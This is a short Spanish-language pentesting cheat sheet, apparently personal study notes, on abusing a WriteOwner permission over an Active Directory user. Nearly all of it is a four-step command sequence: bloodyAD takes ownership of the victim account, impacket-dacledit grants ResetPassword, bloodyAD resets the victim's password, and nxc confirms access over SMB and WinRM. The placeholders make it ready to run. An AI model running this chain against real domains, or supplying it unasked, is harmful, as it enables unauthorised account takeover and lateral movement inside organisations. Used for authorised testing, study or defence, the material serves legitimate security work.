# Abuso ACL 

Tags: #AD #ACL #Linux #Impacket #BloodyAD 

## WriteOwner sobre Usuario 

Si tenemos esta ACL sobre un **User**, podemos **cambiar el propietario del usuario**. Después podemos modificar su ACL, otorgarnos `ResetPassword` y **cambiar su contraseña**.

```bash 
Paso 1:
# Cambiar propietario del usuario víctima a ControlledAccount
❯ bloodyAD -d domain.local -u ControlledAccount -p 'PASSWORD' -H IP_DC set owner TargetUser ControlledAccount

	# TargetUser = Usuario víctima (Objetivo)
	# ControlledAccount = Usuario atacante (Controlas)

Paso 2:
# Dar a ryan el permiso ResetPassword sobre el usuario víctima
❯ impacket-dacledit -action write -rights ResetPassword -principal ControlledAccount -target TargetUser 'domain.local/ControlledAccount:PASSWORD' -dc-ip IP_DC

	# TargetUser = Usuario víctima (Objetivo)
	# ControlledAccount = Usuario atacante (Controlas)

Paso 3:
# Cambiar la contraseña del usuario víctima 
❯ bloodyAD -d domain.local -u ControlledAccount -p 'PASSWORD' -H IP_DC set password TargetUser 'NuevaPassword123!'

	# ControlledAccount = Usuario atacante (Controlas)
	# p = Contraseña del usuario atacante 
	# TargetUser = Usuario víctima (Objetivo)
```

```bash 
Paso 4:
# Verificar el cambio de password 
❯ nxc smb IP_DC -u TargetUser -p 'NuevaPassword123!' 

# Verificar el ingreso por EvilWinRM
❯ nxc winrm IP_DC -u TargetUser -p 'NuevaPassword123!' 
```